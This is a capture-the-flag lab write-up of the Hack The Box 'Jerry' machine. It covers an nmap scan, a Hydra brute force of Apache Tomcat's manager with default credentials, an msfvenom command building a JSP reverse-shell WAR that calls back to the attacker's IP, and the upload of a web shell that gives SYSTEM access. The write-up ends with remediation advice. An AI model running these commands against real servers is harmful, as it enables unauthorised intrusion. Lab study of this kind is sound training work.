+++
draft = false
date = 2020-06-25T16:04:02+01:00
title = "Jerry"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 6
+++


# Machine info

- OS : Windows
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.95


# Mind Map
![Jerry_MindMap](/images/htb/jerry_mindmap.png)


# Reconnaisance

I start with the usual initial scan to check for useful open ports:

{{< highlight html >}}
Nmap scan report for 10.10.10.95
Host is up (0.078s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
{{< /highlight >}}

**Port 8080** appears to be the only one open and running a web server.

# Enumeration

Visiting the resource on `10.10.10.95:8080` I am presented with an Apache Tomcat/7.0.88 Control Panel.

![Jerry_Tomcat](/images/htb/jerry_tomcat.png)

***What is Apache Tomcat?***

>Apache Tomcat (sometimes simply "Tomcat") is an open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and WebSocket technologies. Tomcat provides a "pure Java" HTTP web server environment in which Java code can run.

>Tomcat is developed and maintained by an open community of developers under the auspices of the Apache Software Foundation, released under the Apache License 2.0 license.

Entering the control panel I could be able to upload a custom malicious application to the server acting as a reverse shell. I know that in the case of Tomcat I will need a **.war** file.

>In software engineering, a WAR file (Web Application Resource or Web application Archive) is a file used to distribute a collection of JAR-files, JavaServer Pages, Java Servlets, Java classes, XML files, tag libraries, static web pages (HTML and related files) and other resources that together constitute a web application.

# Exploitation

So let's try to find a way in to Manager App! In order to bruteforce the authentication, I decide to go with Hydra:

{{< highlight html >}}
hydra -C /opt/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
{{< /highlight >}}

Where:
- `-C` is the file containing login and passwords to attempt, in the format "login:pass"
- `http-get` is the service I want to crack

Hydra is able to find out the credentials!

{{< highlight html >}}
[DATA] max 16 tasks per 1 server, overall 16 tasks, 79 login tries, ~5 tries per task
[DATA] attacking http-get://10.10.10.95:8080/manager/html
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 1 valid password found
{{< /highlight >}}

I can now access the control panel!


![Jerry_Tomcat](/images/htb/jerry_tomcat_manageapp.png)

**Note**: The web server is running a 64bit version of Windows Server 2012 R2.

![Jerry_Tomcat](/images/htb/jerry_server_info.png)

I have two options:
1. create a malicious `.war` file containing a reverse shell to my machine using `msfvenom`
2. upload an existing one located under `/usr/share/laudanum/jsp/cmd.war`

In case of option **1**, I can create a reverse shell with `msfvenom` like:

{{< highlight html >}}
msfvenom -p java/jsp_shell_reverse_tcp  LHOST=10.10.14.19 LPORT=4456 -f war > rev_shell.war
Payload size: 1088 bytes
{{< /highlight >}}

I go with option **2**, and after uploading the cmd.war file and visiting `10.10.10.96:8080/cmd/cmd.jsp` I am presented with an interactive reverse shell!

![Jerry_Shell](/images/htb/jerry_shell.png)

Entering the `whoami` command, I can see I'm already **nt authority\system**, so there is no need to proceed with privilege escalation!


## Lessons learned and remediations

- There is an exposed port running Apache Tomcat with default credentials. The administrator should have used
a password that is difficult to crack.
- Tomcat should have been running as a user account and not with SYSTEM privilege.
